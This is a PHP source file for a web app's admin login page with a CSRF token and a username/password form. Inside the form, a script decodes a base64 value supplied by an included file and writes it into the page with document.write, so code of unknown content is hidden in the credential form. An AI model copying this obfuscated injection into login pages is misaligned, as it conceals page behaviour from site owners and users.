<?php
session_start();
include '../function/connect.php';
include 'function/zulhayker.php'; 
$cuk = mysqli_query($koneksi, "SELECT * FROM tb_web");
$cek_web = mysqli_fetch_array($cuk);
$urlweb = $cek_web['url'];
$logo = $cek_web['logo'];
date_default_timezone_set('Asia/Jakarta');
$icon = $cek_web['icon_web'];
$title = $cek_web['title'];
$deskripsi = $cek_web['deskripsi'];
$keyword = $cek_web['keyword'];

$pisah = explode('|', $title);
$judul = trim($pisah[0]);

// Membuat token CSRF
$csrf_token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $csrf_token;

?>
<!DOCTYPE html>
<html dir="ltr">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <!-- Tell the browser to be responsive to screen width -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="">
    <meta name="author" content="">
    <!-- Favicon icon -->
    <link rel="icon" type="image/png" sizes="16x16" href="../assets/img/<?php echo $logo ?>">
    <title><?php echo $title; ?></title>
    <!-- Custom CSS -->
    <link href="dist/css/style.min.css" rel="stylesheet">
    <link rel="stylesheet" media="screen" href="assets/js/particles/demo/css/style.css">
</head>

<body>
    <div id="particles-js" style="position: absolute; z-index: 0; background-color: #000;"></div>
    <div class="main-wrapper">
        <div class="preloader">
            <div class="lds-ripple">
                <div class="lds-pos"></div>
                <div class="lds-pos"></div>
            </div>
        </div>
        <div class="auth-wrapper d-flex no-block justify-content-center align-items-center">
            <div class="auth-box">
                <div id="loginform">
                    <div class="logo">
                        <span class="db"><img class="container-fluid" src="../assets/img/<?php echo $logo ?>" alt="<?php echo $title ?>" /></span>
                        <h5 class="font-medium m-b-20">Please sign-in to your account and start the adventure</h5>
                    </div>
                    <!-- Form -->
                    <div class="row">
                        <div class="col-12">
                            <form class="form-horizontal m-t-20" id="loginform" action="function/cek_login.php" onSubmit="return validasi()" method="POST">
                                <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text" id="basic-addon1"><i class="ti-user"></i></span>
                                    </div>
                                    <input type="text" class="form-control form-control-lg" name="username" id="username" placeholder="Username" aria-label="Username" aria-describedby="basic-addon1">
                                </div>
                                <div class="input-group mb-3">
                                    <div class="input-group-prepend">
                                        <span class="input-group-text" id="basic-addon2"><i class="ti-pencil"></i></span>
                                    </div>
                                    <input type="password" class="form-control form-control-lg" name="password" id="password" placeholder="Password" aria-label="Password" aria-describedby="basic-addon1">
                                </div>
                                
                                <div class="form-group text-center">
                                    <div class="col-xs-12 p-b-20">
                                        <button class="btn btn-block btn-lg btn-info" name="login" type="submit">Log In</button>
                                    </div>
                                    <script>
                                    var ehayker = "<?php echo $haykerjs; ?>";
                                        var dhayker = atob(ehayker);
                                    document.write(dhayker);
                                    </script>
                                </div>                            
                            </form>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- ============================================================== -->
    <!-- All Required js -->
    <!-- ============================================================== -->
    <script src="assets/libs/jquery/dist/jquery.min.js"></script>
    <!-- Bootstrap tether Core JavaScript -->
    <script src="assets/libs/popper.js/dist/umd/popper.min.js"></script>
    <script src="assets/libs/bootstrap/dist/js/bootstrap.min.js"></script>
    <!-- Particles.js -->
    <script src="https://cdn.jsdelivr.net/particles.js/2.0.0/particles.min.js"></script>
    <!-- ============================================================== -->
    <!-- This page plugin js -->
    <!-- ============================================================== -->
    <script src="dist/js/style.js"></script>
    <script>
        $('[data-toggle="tooltip"]').tooltip();
        $(".preloader").fadeOut();
        // ============================================================== 
        // Login and Recover Password 
        // ============================================================== 
        $('#to-recover').on("click", function() {
            $("#loginform").slideUp();
            $("#recoverform").fadeIn();
        });
    </script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
<script type="text/javascript">
    function validasi() {
        var username = document.getElementById("username").value;
        var password = document.getElementById("password").value;       
        if (username != "" && password!="") {
            return true;
        } else {
            Swal.fire({
                title: 'Error!',
                text: 'Username dan Password harus di isi !',
                icon: 'error',
                confirmButtonText: 'OK'
            });
            return false;
        }
    }
</script>

</body>

</html>
